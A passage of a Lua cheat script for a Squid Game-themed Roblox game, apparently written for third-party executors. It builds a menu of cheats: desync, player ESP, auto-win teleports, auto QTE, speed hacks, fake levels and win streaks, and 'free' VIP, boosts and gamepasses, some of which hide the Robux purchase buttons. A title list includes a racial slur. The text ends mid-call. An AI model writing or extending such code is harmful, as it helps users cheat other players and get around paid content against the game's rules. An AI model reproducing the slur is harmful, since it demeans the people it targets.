ToggleRefs.InfiniteJump = MainPlayer:AddToggle("InfiniteJump", {Text="Infinite Jump", Default=false, Tooltip = "Allows your character to infinite jumps", Callback=MainModule.ToggleInfiniteJump})
ToggleRefs.PlayerAttach = MainCombat:AddToggle("PlayerAttach", {Text="Player Attach", Default=false, Callback=MainModule.TogglePlayerAttach, Tooltip = "Automatically follows and stays near nearest target (in HnS: Hider follows Seeker, Seeker follows Hider)"})
ToggleRefs.PlayerAttach:AddKeyPicker("AttachBind", {Default=nil, Mode="Toggle", Text="Player Attach", Callback=function(v) MainModule.TogglePlayerAttach(v) end})
ToggleRefs.FaceTarget = MainCombat:AddToggle("FaceTarget", {Text="Face Target", Default=false, Callback=MainModule.ToggleFaceTarget, Tooltip = "Automatically rotates your character to face nearest player"})
ToggleRefs.FaceTarget:AddKeyPicker("FaceTargetBind", {Default=nil, Mode="Toggle", Text="Face Target", Callback=function(v) MainModule.ToggleFaceTarget(v) end})

if MainModule.IsFeatureSupported("Desync") then
    ToggleRefs.Desync = MainCombat:AddToggle("Desync", {Text="Desync", Default=false, Callback=MainModule.ToggleDesync, Tooltip = "Desyncs your position from server (Only powerful execs)"})
    ToggleRefs.Desync:AddKeyPicker("DesyncBind", {Default=nil, Mode="Toggle", Text="Desync", Callback=function(v) MainModule.ToggleDesync(v) end})
else
    local desyncToggle = MainCombat:AddToggle("Desync", {Text="Desync (Unsupported)", Default=false, Callback=MainModule.ToggleDesync})
    desyncToggle:SetDisabled(true)
end

ToggleRefs.PlayerESP = MainMisc:AddToggle("PlayerESP", {
    Text = "Players ESP",
    Default = false,
    Callback = function(value)
        MainModule.TogglePlayerESP(value)
    end,
})

local espDropdown = MainMisc:AddDropdown("ESPMode", {
    Text = "ESP Mode",
    Default = "New",
    Values = {"New", "Old"},
    Callback = function(value)
        MainModule.SetESPMode(value)
    end
})
MainModule.QuicksilverEnabled = false
MainModule.QuicksilverConnection = nil
MainModule.QuicksilverSpeed = 32
MainModule.QuicksilverMaxSpeed = 100
MainModule.QuicksilverMinSpeed = 32
MainModule.QuicksilverIncrement = 0.5
MainModule.QuicksilverLastTick = 0
MainModule.QuicksilverDirection = 1
MainModule.QuicksilverOriginalSpeed = 32

MainModule.ToggleQuicksilver = function(enabled)
    MainModule.QuicksilverEnabled = enabled
    
    if MainModule.QuicksilverConnection then
        MainModule.QuicksilverConnection:Disconnect()
        MainModule.QuicksilverConnection = nil
    end
    
    if enabled then
        local character = MainModule.GetCharacter()
        if character then
            local humanoid = MainModule.GetHumanoid(character)
            if humanoid then
                MainModule.QuicksilverOriginalSpeed = humanoid.WalkSpeed
                MainModule.QuicksilverSpeed = humanoid.WalkSpeed
                MainModule.QuicksilverLastTick = tick()
            end
        end
        
        MainModule.QuicksilverConnection = RunService.Heartbeat:Connect(function()
            if not MainModule.QuicksilverEnabled then return end
            
            local character = MainModule.GetCharacter()
            if not character then return end
            
            local humanoid = MainModule.GetHumanoid(character)
            if not humanoid then return end
            
            local now = tick()
            if now - MainModule.QuicksilverLastTick >= 4 then
                MainModule.QuicksilverSpeed = MainModule.QuicksilverSpeed + MainModule.QuicksilverIncrement * MainModule.QuicksilverDirection
                
                if MainModule.QuicksilverSpeed >= MainModule.QuicksilverMaxSpeed then
                    MainModule.QuicksilverSpeed = MainModule.QuicksilverMaxSpeed
                    MainModule.QuicksilverDirection = -1
                elseif MainModule.QuicksilverSpeed <= MainModule.QuicksilverMinSpeed then
                    MainModule.QuicksilverSpeed = MainModule.QuicksilverMinSpeed
                    MainModule.QuicksilverDirection = 1
                end
                
                humanoid.WalkSpeed = MainModule.QuicksilverSpeed
                MainModule.QuicksilverLastTick = now
            end
        end)
        
    else
        local character = MainModule.GetCharacter()
        if character then
            local humanoid = MainModule.GetHumanoid(character)
            if humanoid then
                humanoid.WalkSpeed = MainModule.QuicksilverOriginalSpeed or 32
                MainModule.QuicksilverSpeed = MainModule.QuicksilverOriginalSpeed or 32
            end
        end
        MainModule.QuicksilverDirection = 1
    end
    
    PlayToggleSound()
end

ToggleRefs.Quicksilver = MainExtras:AddToggle("Quicksilver", {
    Text = "Free Quicksilver",
    Default = false,
    Tooltip = "Increase speed every 4 seconds",
    Callback = MainModule.ToggleQuicksilver
})

local parkourToggle = MainExtras:AddToggle("ParkourArtist", {
    Text = "Free Parkour Atrist",
    Default = false,
    Tooltip = "Equips Parkour Artist ability for free",
    Callback = MainModule.ToggleParkourArtist
})

ToggleRefs.AutoWin = MainAuto:AddToggle("AutoWin", {Text="Auto Win", Default=false, Callback=MainModule.ToggleAutoWin, Tooltip = "Automatically teleports to end/safezone in RLGL, Dalgona, Light's out, HideAndSeek (Only Hider), JumpRope, GlassBridge"})

ToggleRefs.FreeDash = MainExtras:AddToggle("FreeDash", {Text="Unlock Faster Sprint 6", Default=false, Tooltip = "Gives 6 lvl of sprint boost (chargeable dash) when ur level 5 ", Callback=function(enabled) ToggleFreeDash(enabled) end})
ToggleRefs.PhantomDash = MainExtras:AddToggle("PhantomDash", {
    Text = "Phantom Dash",
    Default = false,
    Callback = MainModule.TogglePhantomDash,
    Tooltip = "Press Q to dash forward/backward with diagonal cluster trail effects. Works on PC and Mobile."
})

MainExtras:AddSlider("PhantomDashDistance", {
    Text = "Dash Distance",
    Default = 15,
    Min = 5,
    Max = 50,
    Rounding = 1,
    Callback = MainModule.SetPhantomDashDistance,
    Tooltip = "How far the dash travels"
})

MainExtras:AddSlider("PhantomDashDuration", {
    Text = "Dash Duration",
    Default = 25,
    Min = 10,
    Max = 100,
    Rounding = 1,
    Callback = MainModule.SetPhantomDashDuration,
    Tooltip = "How fast the dash is (lower = faster)"
})

MainExtras:AddSlider("PhantomDashCooldown", {
    Text = "Charge Cooldown",
    Default = 1,
    Min = 0.5,
    Max = 5,
    Rounding = 1,
    Callback = MainModule.SetPhantomDashCooldown,
    Tooltip = "Time to recharge one dash charge"
})

MainExtras:AddSlider("PhantomDashMaxCharges", {
    Text = "Max Charges",
    Default = 2,
    Min = 1,
    Max = 5,
    Rounding = 0,
    Callback = MainModule.SetPhantomDashMaxCharges,
    Tooltip = "Maximum number of dash charges"
})
ToggleRefs.AutoNextGame = MainAuto:AddToggle("AutoNextGame", {Text="Auto Next Game", Default=false, Callback=MainModule.ToggleAutoNextGame, Tooltip = "Automatically teleports you to the next game"})

MainExtras:AddButton("Teleport Up 100", MainModule.TeleportUp, {Tooltip = "Teleports your character 100 studs up"})
MainExtras:AddButton("Teleport Down 40", MainModule.TeleportDown, {Tooltip = "Teleports your character 40 studs down"})

ToggleRefs.AutoSafe = MainAuto:AddToggle("AutoSafe", {Text="Safe Place on Low Health", Default=false, Callback=MainModule.ToggleAutoSafe, Tooltip = "Teleports you to 100 blocks up when you have 30 HP or lowest"})

local SkySquidAntiFall2 = MainExtras:AddToggle("Antifall", {
    Text = "AntiFall",
    Default = false,
    Tooltip = "Creates invisible platform",
    Callback = function(value)
        MainModule.ToggleSkySquidAntiFall(value)
    end
})

SkySquidAntiFall2:AddKeyPicker("Antifallkeypicker", {
    Default = nil,
    Mode = "Toggle",
    Text = "AntiFall",
    Callback = function(value)
        MainModule.ToggleSkySquidAntiFall(value)
        SkySquidAntiFall2:SetValue(value)
    end
})

ToggleRefs.AutoSkip = MainAuto:AddToggle("AutoSkip", {
    Text = "Auto Skip Dialogues",
    Default = false,
    Tooltip = "Auto skip dialogues",
    Callback = MainModule.ToggleAutoSkip
})

ToggleRefs.AutoCollectBandage = MainAuto:AddToggle("AutoCollectBandage", {
    Text = "Auto Collect Bandage",
    Default = false,
    Tooltip = "Automatically teleports you to the dropped bandage when you dont have one",
    Callback = MainModule.ToggleAutoCollectBandage
})

ToggleRefs.AutoCollectFlashbang = MainAuto:AddToggle("AutoCollectFlashbang", {
    Text = "Auto Collect Flashbang",
    Default = false,
    Tooltip = "Automatically collects dropped flashbangs",
    Callback = MainModule.ToggleAutoCollectFlashbang
})

ToggleRefs.AutoCollectGrenade = MainAuto:AddToggle("AutoCollectGrenade", {
    Text = "Auto Collect Grenade",
    Default = false,
    Tooltip = "Automatically collects dropped grenades",
    Callback = MainModule.ToggleAutoCollectGrenade
})

local autoVoteToggle = MainAuto:AddToggle("AutoVote", {
    Text = "Auto Vote",
    Default = false,
    Tooltip = "Automatically votes for continue or rebel (Keep playing = dalgona/tugofwar/jumprope/continue. Stop playing = pentathlon/hidenseek/glassbridge/rebel",
    Callback = MainModule.ToggleAutoVote
})

local voteDropdown = MainAuto:AddDropdown("VoteOption", {
    Text = "Vote Option",
    Default = "KeepPlaying",
    Values = { "KeepPlaying", "StopPlaying" },
    Tooltip = "Select your vote option",
    Callback = function(value)
        MainModule.SetVoteOption(value)
    end
})

ToggleRefs.RageAutoQTE = MainAuto:AddToggle("RageAutoQTE", {
    Text = "RAGE Auto QTE", 
    Default = false, 
    Callback = MainModule.ToggleRageAutoQTE,
    Tooltip = "legit"
})

ToggleRefs.LegitAutoQTE = MainAuto:AddToggle("LegitAutoQTE", {
    Text = "Legit Auto QTE", 
    Default = false, 
    Callback = MainModule.ToggleLegitAutoQTE,
    Tooltip = "legit"
})

MainExtras:AddDivider()

local titleDropdown = MainExtras:AddDropdown("TitleSelect", {
    Text = "Select Title",
    Default = "Rich Billionaire",
    Tooltip = "Select Custom title (NOT FE)",
    Values = {
        "Manipulator",
        "Rich Millionaire",
        "Rich Billionaire",
        "Fallen Angel",
        "Zeus",
        "Content Creator",
        "Aura Farmer",
        "The Recruiter",
        "Tanos",
        "The Glass Maker",
        "Frontman",
        "Squidder",
        "Game VIP",
        "Sackboy",
        "Him",
        "Honeycomb Artist",
        "The Chosen One",
        "Content Creator",
        "Game Developer",
        "Game Administrator",
        "Game Animator",
        "Game Artist",
        "Game Builder",
        "Game Contributer",
        "Game Modeller",
        "Game Moderator",
        "Game SFX Designer",
        "The Strongest",
        "The Perfect Lifeform",
        "Voice Actor",
        "SFX Designer",
        "Tanos",
        "Him",
        "Her",
        "Devil's Advocate",
        "Frontman",
        "Gambler",
        "Gunner",
        "Marksman",
        "Gay",
        "Nigga",
        "Mastermind",
        "King of Curses",
        "Escape Artist",
        "Protagonist",
    },
    Callback = function(value)
        MainModule.SetTitle(value)
    end
})

ToggleRefs.FreeTitle = MainExtras:AddToggle("FreeTitle", {
    Text = "Free Title (NOT FE)",
    Default = false,
    Callback = MainModule.ToggleFreeTitle
})

MainModule.CustomLevelEnabled = false
MainModule.CustomLevelValue = 1
MainModule.CustomLevelConnection = nil

MainModule.ToggleCustomLevel = function(enabled)
    MainModule.CustomLevelEnabled = enabled
    
    if MainModule.CustomLevelConnection then
        MainModule.CustomLevelConnection:Disconnect()
        MainModule.CustomLevelConnection = nil
    end
    
    if enabled then
        LocalPlayer:SetAttribute("_CurrentLevel", MainModule.CustomLevelValue)
        MainModule.CustomLevelConnection = RunService.Heartbeat:Connect(function()
            if MainModule.CustomLevelEnabled then
                LocalPlayer:SetAttribute("_CurrentLevel", MainModule.CustomLevelValue)
            end
        end)
    else
    end
    PlayToggleSound()
end

MainModule.SetCustomLevel = function(value)
    local num = tonumber(value)
    if num and num >= 1 and num <= 999999 then
        MainModule.CustomLevelValue = math.floor(num)
        if MainModule.CustomLevelEnabled then
            LocalPlayer:SetAttribute("_CurrentLevel", MainModule.CustomLevelValue)
        end
    else
        MainModule.Notify("Custom Level", "Invalid number (1-999999)", 0.9)
        PlayErrorSound()
    end
end

MainModule.SetAllLevelAttributes = function(value)
    local num = tonumber(value)
    if num and num >= 1 then
        local attributes = {
            "_CurrentLevel",
            "CurrentLevel",
            "_Level",
            "Level"
        }
        
        for _, attr in ipairs(attributes) do
            pcall(function()
                LocalPlayer:SetAttribute(attr, math.floor(num))
            end)
        end
        
        if MainModule.CustomLevelEnabled then
            MainModule.CustomLevelValue = math.floor(num)
        end
        
        PlayBell()
    else
        PlayErrorSound()
    end
end

MainModule.CustomWinstreakEnabled = false
MainModule.CustomWinstreakValue = 0
MainModule.CustomWinstreakConnection = nil

MainModule.ToggleCustomWinstreak = function(enabled)
    MainModule.CustomWinstreakEnabled = enabled
    
    if MainModule.CustomWinstreakConnection then
        MainModule.CustomWinstreakConnection:Disconnect()
        MainModule.CustomWinstreakConnection = nil
    end
    
    if enabled then
        LocalPlayer:SetAttribute("_ConsecutiveWins", MainModule.CustomWinstreakValue)
        MainModule.CustomWinstreakConnection = RunService.Heartbeat:Connect(function()
            if MainModule.CustomWinstreakEnabled then
                LocalPlayer:SetAttribute("_ConsecutiveWins", MainModule.CustomWinstreakValue)
            end
        end)
    else
    end
    PlayToggleSound()
end

MainModule.SetCustomWinstreak = function(value)
    local num = tonumber(value)
    if num and num >= 0 and num <= 999999 then
        MainModule.CustomWinstreakValue = math.floor(num)
        if MainModule.CustomWinstreakEnabled then
            LocalPlayer:SetAttribute("_ConsecutiveWins", MainModule.CustomWinstreakValue)
        end
    else
        MainModule.Notify("Custom Winstreak", "Invalid number (0-999999)", 0.9)
        PlayErrorSound()
    end
end

MainModule.SetAllWinstreakAttributes = function(value)
    local num = tonumber(value)
    if num and num >= 0 then
        local attributes = {
            "_ConsecutiveWins",
            "ConsecutiveWins",
            "_WinStreak",
            "WinStreak",
            "_CurrentStreak",
            "CurrentStreak",
            "_Streak",
            "Streak"
        }
        
        for _, attr in ipairs(attributes) do
            pcall(function()
                LocalPlayer:SetAttribute(attr, math.floor(num))
            end)
        end
        
        if MainModule.CustomWinstreakEnabled then
            MainModule.CustomWinstreakValue = math.floor(num)
        end
        
        MainModule.Notify("Winstreak", "Set to: " .. math.floor(num), 0.9)
    else
        MainModule.Notify("Winstreak", "Invalid number!", 0.9)
        PlayErrorSound()
    end
end

MainModule.ClothesColorEnabled = false
MainModule.ClothesColor = Color3.fromRGB(255, 0, 0)
MainModule.OriginalShirt = nil
MainModule.OriginalPants = nil
MainModule.ClothesConnection = nil

local function ChangeClothesColor()
    local character = MainModule.GetCharacter()
    if not character then return end
    
    local shirt = character:FindFirstChild("Shirt")
    local pants = character:FindFirstChild("Pants")
    
    if shirt and pants then
        if not MainModule.OriginalShirt then
            MainModule.OriginalShirt = shirt.ShirtTemplate
        end
        if not MainModule.OriginalPants then
            MainModule.OriginalPants = pants.PantsTemplate
        end
        
        pcall(function()
            shirt.Color3 = MainModule.ClothesColor
            pants.Color3 = MainModule.ClothesColor
        end)
    end
end

MainModule.ToggleClothesColor = function(enabled)
    MainModule.ClothesColorEnabled = enabled
    
    if MainModule.ClothesConnection then
        MainModule.ClothesConnection:Disconnect()
        MainModule.ClothesConnection = nil
    end
    
    if enabled then
        ChangeClothesColor()
        MainModule.ClothesConnection = RunService.Heartbeat:Connect(function()
            if MainModule.ClothesColorEnabled then
                ChangeClothesColor()
            end
        end)
        MainModule.Notify("Clothes Color", "Enabled", 0.9)
    else
        local character = MainModule.GetCharacter()
        if character then
            local shirt = character:FindFirstChild("Shirt")
            local pants = character:FindFirstChild("Pants")
            if shirt and pants then
                pcall(function()
                    shirt.Color3 = Color3.fromRGB(255, 255, 255)
                    pants.Color3 = Color3.fromRGB(255, 255, 255)
                end)
            end
        end
        MainModule.Notify("Clothes Color", "Disabled", 0.9)
    end
    PlayToggleSound()
end

MainModule.SetClothesColor = function(color)
    MainModule.ClothesColor = color
    if MainModule.ClothesColorEnabled then
        ChangeClothesColor()
    end
end

local clothesToggle = CustomWinAndMore:AddToggle("ClothesColor", {
    Text = "Custom Clothes Color",
    Default = false,
    Tooltip = "Changes your shirt and pants color",
    Callback = MainModule.ToggleClothesColor
})

clothesToggle:AddColorPicker("ClothesColorPicker", {
    Default = Color3.fromRGB(255, 0, 0),
    Title = "Clothes Color",
    Callback = function(color)
        MainModule.SetClothesColor(color)
    end
})

local customTagToggle = CustomWinAndMore:AddToggle("CustomPlayerTag", {
    Text = "Custom Player Tag",
    Default = false,
    Tooltip = "Sets custom number tag (0-999)",
    Callback = MainModule.ToggleCustomPlayerTag
})

local winToggle = CustomWinAndMore:AddToggle("CustomWin", {
    Text = "Custom Wins",
    Default = false,
    Tooltip = "Sets custom win count on your leaderboard (visual only)",
    Callback = MainModule.ToggleCustomWin
})

local winstreakToggle = CustomWinAndMore:AddToggle("CustomWinstreak", {
    Text = "Custom Winstreak",
    Default = false,
    Tooltip = "Sets custom win streak count on your leaderboard (visual only)",
    Callback = MainModule.ToggleCustomWinstreak
})

local levelToggle = CustomWinAndMore:AddToggle("CustomLevel", {
    Text = "Custom Level",
    Default = false,
    Tooltip = "Sets custom level on your profile (visual only)",
    Callback = MainModule.ToggleCustomLevel
})

CustomWinAndMore:AddInput("CustomTagInput", {
    Text = "Custom Tag Number",
    Default = nil,
    Tooltip = "Set custom tag",
    Placeholder = "Enter number",
    Callback = function(value)
        local num = tonumber(value)
        if num and num >= 0 and num <= 999 then
            MainModule.SetCustomTagValue(math.floor(num))
            if customTagToggle.Value then
                MainModule.SetCustomPlayerTag(num)
            end
        else
            MainModule.Notify("Custom Tag", "Invalid number!", 0.9)
            PlayErrorSound()
        end
    end
})

CustomWinAndMore:AddInput("CustomWinInput", {
    Text = "Custom Win Value",
    Default = nil,
    Placeholder = "Enter number",
    Tooltip = "Set custom wins count",
    Callback = function(value)
        MainModule.SetCustomWin(value)
    end
})

CustomWinAndMore:AddInput("WinstreakInput", {
    Text = "Custom Winstreak",
    Default = nil,
    Placeholder = "Enter number",
    Tooltip = "Enter custom winstreak on your leaderboard (visual only) ",
    Callback = function(value)
        MainModule.SetCustomWinstreak(value)
    end
})

CustomWinAndMore:AddInput("CustomLevelInput", {
    Text = "Custom Level Value",
    Default = nil,
    Placeholder = "Enter number",
    Tooltip = "Set custom level",
    Callback = function(value)
        MainModule.SetCustomLevel(value)
    end
})

local EmotesList = {
    {Name = "Dream Journal", AnimId = "rbxassetid://117325441970867", SoundId = "rbxassetid://88476306353688", Volume = 10},
    {Name = "Otsukare Summer", AnimId = "rbxassetid://134888005420629", SoundId = "rbxassetid://127332409398776", Volume = 3},
    {Name = "Spite", AnimId = "rbxassetid://100382123964355", SoundId = "rbxassetid://90513005423910", Volume = 5},
    {Name = "Posing Time", AnimId = "rbxassetid://89240795237958", SoundId = "rbxassetid://113259086406604", Volume = 5},
    {Name = "Shuffle", AnimId = "rbxassetid://113121578988536", SoundId = "rbxassetid://127426881747595", Volume = 5},
    {Name = "Yare Yare", AnimId = "rbxassetid://86642655479570", SoundId = "rbxassetid://128193072645447", Volume = 5},
    {Name = "My Perfect Victory", AnimId = "rbxassetid://110501561372722", SoundId = "rbxassetid://104280886491008", Volume = 5},
    {Name = "Fate Of Both Worlds", AnimId = "rbxassetid://114244682550258", SoundId = "rbxassetid://103081000050688", Volume = 5},
    {Name = "Peanut of Butter House", AnimId = "rbxassetid://108074529570331", SoundId = "rbxassetid://95893903149232", Volume = 5},
    {Name = "Cat Hands", AnimId = "rbxassetid://87331103640233", SoundId = "rbxassetid://126527049854337", Volume = 5},
    {Name = "The System", AnimId = "rbxassetid://117978762262770", SoundId = "rbxassetid://73318799732606", Volume = 5},
    {Name = "Gear 5", AnimId = "rbxassetid://107815350238463", SoundId = nil, Volume = 5},
    {Name = "Mingle Dance", AnimId = "rbxassetid://99559083669885", SoundId = "rbxassetid://89379201770587", Volume = 5},
    {Name = "Metro Dance", AnimId = "rbxassetid://104701586795462", SoundId = "rbxassetid://95730226592096", Volume = 5},
    {Name = "Funeral for the living", AnimId = "rbxassetid://123297701965318", SoundId = "rbxassetid://105930820096344", Volume = 5},
    {Name = "Cartwheel", AnimId = "rbxassetid://131418698864660", SoundId = "rbxassetid://18911882091", Volume = 5},
    {Name = "Lively Walk", AnimId = "rbxassetid://99556634315867", SoundId = "rbxassetid://16706317921", Volume = 5},
    {Name = "Dance of nights", AnimId = "rbxassetid://100183800468181", SoundId = "rbxassetid://133365635431929", Volume = 5},
    {Name = "Sonic run", AnimId = "rbxassetid://120151271879240", SoundId = "rbxassetid://131594734029433", Volume = 5},
    {Name = "Khabilame", AnimId = "rbxassetid://133158883386630", SoundId = "rbxassetid://131852145461258", Volume = 5},
    {Name = "Mii swing", AnimId = "rbxassetid://111293910946685", SoundId = "rbxassetid://121596432073446", Volume = 5},
    {Name = "Jackpot", AnimId = "rbxassetid://90063856357375", SoundId = "rbxassetid://96528255406149", Volume = 5},
    {Name = "Scuba", AnimId = "rbxassetid://125809050313880", SoundId = "rbxassetid://78439444151879", Volume = 5},
    {Name = "Crying", AnimId = "rbxassetid://96313533433486", SoundId = "rbxassetid://18151791880", Volume = 5},
    {Name = "Ogame", AnimId = "rbxassetid://117778295104747", SoundId = "rbxassetid://122457089809687", Volume = 5},
    {Name = "Blue Shirt Kid", AnimId = "rbxassetid://83396620848313", SoundId = "rbxassetid://115875415839739", Volume = 5},
    {Name = "Zepelli", AnimId = "rbxassetid://135418027114658", SoundId = nil, Volume = 5},
    {Name = "Woke Up The World", AnimId = "rbxassetid://130106286443990", SoundId = "rbxassetid://0275579621574", Volume = 5},
    {Name = "Mask", AnimId = "rbxassetid://102176887169297", SoundId = "rbxassetid://97952595881264", Volume = 5}
    
}

local currentEmoteAnim = nil
local currentEmoteSound = nil
local isPlaying = false
local emoteDropdown = nil
local emoteButton = nil

local function StopCurrentEmote()
    if currentEmoteAnim then
        pcall(function() currentEmoteAnim:Stop() end)
        currentEmoteAnim = nil
    end
    if currentEmoteSound then
        pcall(function() currentEmoteSound:Stop() end)
        pcall(function() currentEmoteSound:Destroy() end)
        currentEmoteSound = nil
    end
    isPlaying = false
    if emoteButton then
        emoteButton:SetText("Play Emote")
    end
end

local function PlayEmote(emoteData)
    StopCurrentEmote()
    
    local h = MainModule.GetHumanoid(MainModule.GetCharacter())
    if not h then
        return
    end
    
    local anim = Instance.new("Animation")
    anim.AnimationId = emoteData.AnimId
    currentEmoteAnim = h:LoadAnimation(anim)
    currentEmoteAnim:Play()
    
    if emoteData.SoundId then
        local s = Instance.new("Sound")
        s.SoundId = emoteData.SoundId
        s.Volume = emoteData.Volume or 5
        s.Looped = true
        s.Parent = SoundService
        s:Play()
        currentEmoteSound = s
    end
    
    isPlaying = true
    if emoteButton then
        emoteButton:SetText("Stop Emoting")
    end
   -- Library:Notify({Title = "Emote", Description = "Active emote: " .. emoteData.Name, Duration = 0.9})
    PlayBell()
end

local emoteNames = {}
for _, emote in ipairs(EmotesList) do
    table.insert(emoteNames, emote.Name)
end

local emoteSearchBox = MainEmotes:AddInput("EmoteSearch", {
    Text = "Search Emote",
    Default = "",
    Placeholder = "Type emote name",
    Callback = function(value)
        if value and value ~= "" then
            local filteredEmotes = {}
            for _, emote in ipairs(emoteNames) do
                if string.lower(emote):find(string.lower(value)) then
                    table.insert(filteredEmotes, emote)
                end
            end
            if #filteredEmotes > 0 then
                emoteDropdown:SetValues(filteredEmotes)
                emoteDropdown:SetValue(filteredEmotes[1])
            else
                emoteDropdown:SetValues({"No results"})
            end
        else
            emoteDropdown:SetValues(emoteNames)
            emoteDropdown:SetValue(emoteNames[1])
        end
    end
})

emoteDropdown = MainEmotes:AddDropdown("EmoteSelector", {
    Text = "Select Emote",
    Default = emoteNames[1],
    Values = emoteNames,
    Callback = function(selected)
    end
})

emoteButton = MainEmotes:AddButton("Play/Stop Emote", function()
    if isPlaying then
        StopCurrentEmote()
    else
        local selected = emoteDropdown.Value
        for _, emote in ipairs(EmotesList) do
            if emote.Name == selected then
                PlayEmote(emote)
                break
            end
        end
    end
    PlayBell()
end, {Tooltip = "Play or stop selected emote"})

local function FixMobileVolume()
    if MainModule.IsMobile() then
        for _, emote in ipairs(EmotesList) do
            emote.Volume = 3
        end
    end
end

FixMobileVolume()
MainModule.WonBoostEnabled = false
MainModule.WonBoostConnection = nil

MainModule.ToggleWonBoost = function()
    local player = LocalPlayer
    local boosts = player:FindFirstChild("Boosts")
    if not boosts then
        MainModule.Notify("Won Boost", "Boosts not found!", 0.9)
        PlayErrorSound()
        return
    end
    
    local wonBoost = boosts:FindFirstChild("Won Boost")
    if not wonBoost then
        MainModule.Notify("Won Boost", "Won Boost not found!", 0.9)
        PlayErrorSound()
        return
    end
    
    if MainModule.WonBoostEnabled then
        MainModule.WonBoostEnabled = false
        if MainModule.WonBoostConnection then
            MainModule.WonBoostConnection:Disconnect()
            MainModule.WonBoostConnection = nil
        end
        PlayToggleSound()
        return
    end
    
    MainModule.WonBoostEnabled = true
    wonBoost.Value = 5
    
    local boostUI = player.PlayerGui:FindFirstChild("ShopGui")
    if boostUI then
        boostUI = boostUI:FindFirstChild("StoreHolder")
        if boostUI then
            boostUI = boostUI:FindFirstChild("Store")
            if boostUI then
                boostUI = boostUI:FindFirstChild("PAGES")
                if boostUI then
                    boostUI = boostUI:FindFirstChild("Boosts")
                    if boostUI then
                        boostUI = boostUI:FindFirstChild("Won Boost")
                    end
                end
            end
        end
    end
    
    MainModule.WonBoostConnection = RunService.Heartbeat:Connect(function()
        if not MainModule.WonBoostEnabled then return end
        
        local b = LocalPlayer:FindFirstChild("Boosts")
        if b then
            local wb = b:FindFirstChild("Won Boost")
            if wb and wb.Value ~= 5 then
                wb.Value = 5
            end
        end
        
        if boostUI then
            pcall(function()
                local buyRobux = boostUI:FindFirstChild("BuyButtonRobux")
                local buyCoin = boostUI:FindFirstChild("BuyButtonCoin")
                local itemLevel = boostUI:FindFirstChild("ItemLevel")
                
                if buyRobux then buyRobux.Visible = false end
                if buyCoin then buyCoin.Visible = false end
                if itemLevel then itemLevel.Text = "Current Level (5)" end
            end)
        end
    end)
    
    PlayBell()
end

MainModule.StrengthBoostEnabled = false
MainModule.StrengthBoostConnection = nil

MainModule.ToggleStrengthBoost = function()
    local player = LocalPlayer
    local boosts = player:FindFirstChild("Boosts")
    if not boosts then
        MainModule.Notify("Strength Boost", "Boosts not found!", 0.9)
        PlayErrorSound()
        return
    end
    
    local damageBoost = boosts:FindFirstChild("Damage Boost")
    if not damageBoost then
        MainModule.Notify("Strength Boost", "Damage Boost not found!", 0.9)
        PlayErrorSound()
        return
    end
    
    if MainModule.StrengthBoostEnabled then
        MainModule.StrengthBoostEnabled = false
        if MainModule.StrengthBoostConnection then
            MainModule.StrengthBoostConnection:Disconnect()
            MainModule.StrengthBoostConnection = nil
        end
        PlayToggleSound()
        return
    end
    
    MainModule.StrengthBoostEnabled = true
    damageBoost.Value = 5
    
    local boostUI = player.PlayerGui:FindFirstChild("ShopGui")
    if boostUI then
        boostUI = boostUI:FindFirstChild("StoreHolder")
        if boostUI then
            boostUI = boostUI:FindFirstChild("Store")
            if boostUI then
                boostUI = boostUI:FindFirstChild("PAGES")
                if boostUI then
                    boostUI = boostUI:FindFirstChild("Boosts")
                    if boostUI then
                        boostUI = boostUI:FindFirstChild("Damage Boost")
                    end
                end
            end
        end
    end
    
    MainModule.StrengthBoostConnection = RunService.Heartbeat:Connect(function()
        if not MainModule.StrengthBoostEnabled then return end
        
        local b = LocalPlayer:FindFirstChild("Boosts")
        if b then
            local db = b:FindFirstChild("Damage Boost")
            if db and db.Value ~= 5 then
                db.Value = 5
            end
        end
        
        if boostUI then
            pcall(function()
                local buyRobux = boostUI:FindFirstChild("BuyButtonRobux")
                local buyCoin = boostUI:FindFirstChild("BuyButtonCoin")
                local itemLevel = boostUI:FindFirstChild("ItemLevel")
                
                if buyRobux then buyRobux.Visible = false end
                if buyCoin then buyCoin.Visible = false end
                if itemLevel then itemLevel.Text = "Current Level (5)" end
            end)
        end
    end)
    
    PlayBell()
end
MainModule.UnlockVIP = function()
    local function SetAttr(obj, name, value)
        pcall(function()
            obj:SetAttribute(name, value)
        end)
    end
    
    SetAttr(LocalPlayer, "__OwnsVIPGamepass", true)
    SetAttr(LocalPlayer, "VIPChatTag", true)
    SetAttr(LocalPlayer, "VIPJoinAlert", true)
    SetAttr(LocalPlayer, "VIPHideWins", false)
    SetAttr(LocalPlayer, "_VIPSettingData", "{\"Hide Wins\":false,\"Custom Clothing Colorpicker\":\"None\",\"Custom Clothing Color\":true}")
    SetAttr(LocalPlayer, "CloatingColor", Color3.fromRGB(255, 255, 255))
    
    PlayBell()
end
MainGamepasses:AddButton("Enable Won Boost (Level 5)", MainModule.ToggleWonBoost, {Tooltip = "Sets Won Boost to level 5"})
MainGamepasses:AddButton("Enable Strength Boost (Level 5)", MainModule.ToggleStrengthBoost, {Tooltip = "Sets Damage Boost to level 5"})
MainGamepasses:AddDivider()
MainGamepasses:AddButton("Free VIP", MainModule.UnlockVIP, {Tooltip = "Gives you all VIP attributes for free"})
ToggleRefs.PermanentGuard = MainGamepasses:AddToggle("PermanentGuard", {Text="Permanent Guard", Default=false, Callback=MainModule.TogglePermanentGuard, Tooltip = "Gives permanent guard gamepass for free (FE)"})
ToggleRefs.CustomPlayerTag = MainGamepasses:AddToggle("CustomPlayerTag", {Text="Custom Player Tag", Default=false, Callback=MainModule.ToggleCustomPlayerTag, Tooltip = "Gives Custom Player Tag gamepass for free"})
ToggleRefs.PrivateServerPlus = MainGamepasses:AddToggle("PrivateServerPlus", {Text="Private Server Plus", Default=false, Callback=MainModule.TogglePrivateServerPlus, Tooltip = "Gives PS+ gamepass for free (NOT FE)"})
ToggleRefs.Lighter = MainGamepasses:AddToggle("Lighter", {Text="Lighter", Default=false, Callback=MainModule.ToggleLighter, Tooltip = 'Gives lighter for dalgona game'})

local UISettingsTab = Window:AddTab("Settings", "settings")

local MenuBox = UISettingsTab:AddLeftGroupbox("Menu", "menu")
local InfoBox = UISettingsTab:AddRightGroupbox("Credits", "heart")

MenuBox:AddToggle("KeybindMenuOpen", {
    Text = "Open Keybind Menu",
    Tooltip = "Shows Library Keybinds menu",
    Default = Library.KeybindFrame.Visible,
    Callback = function(State)
        Library.KeybindFrame.Visible = State
    end
})

MenuBox:AddDropdown("NotificationSide", {
    Callback = function(Value)
        Library:SetNotifySide(Value)
    end,
